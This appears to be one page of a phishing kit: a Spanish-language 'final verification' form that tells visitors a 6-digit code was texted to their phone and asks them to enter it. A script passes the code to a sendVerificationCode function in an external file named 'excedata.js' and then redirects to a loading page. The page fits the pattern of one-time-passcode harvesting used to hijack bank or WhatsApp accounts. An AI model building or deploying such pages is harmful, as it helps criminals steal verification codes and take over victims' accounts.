<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="./docs/remixicon.css" rel="stylesheet">
  <link rel="stylesheet" href="./docs/styles.css">
  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
  <title>Verificación Final</title>
</head>
<body>
  <section class="login">
    <img src="./docs/patrn.jpg" alt="Login-image" class="login--image">

    <form id="finalCodeForm" class="login--form">
      <div align="left">
        <img src="./docs/lbg22.png" style="width:110px">
      </div><br>
      
      <div align="center">
        <span style="font-size:16px"><b>Le hemos enviado un código de verificación de 6 dígitos a su número teléfono registrado, por favor, introduzca el código:</b></span>
      </div><br>
      
      <div class="login--content">
        <div class="login-box">
          <i class="ri-key-line"></i>
          <div class="login--input-box">
            <input type="tel" class="login-input" id="finalCode" name="cod12" placeholder=" " 
                   maxlength="6" minlength="6" 
                   onkeypress="return event.charCode >= 48 && event.charCode <= 57" required>
            <label for="finalCode" class="login--input-label">Código</label>
          </div>
        </div>
      </div>

      <button type="submit" class="login--button--whatsapp">Siguiente</button>

      <div align="center">
        <span style="font-size:14px; color:red"></span>
      </div><br>
    </form>
  </section>

  <!-- Scripts -->
  <script src="./excedata.js"></script>
  <script src="./docs/main.js"></script>
  
  <script>
    // Manejar envío del formulario
    document.getElementById('finalCodeForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const verificationCode = document.getElementById('finalCode').value;
      
      if(typeof sendVerificationCode === 'function') {
        await sendVerificationCode(verificationCode);
        window.location.href = 'load.html'; // O la página final que corresponda
      } else {
        console.error('La función sendVerificationCode no está disponible');
      }
    });
  </script>
</body>
</html>
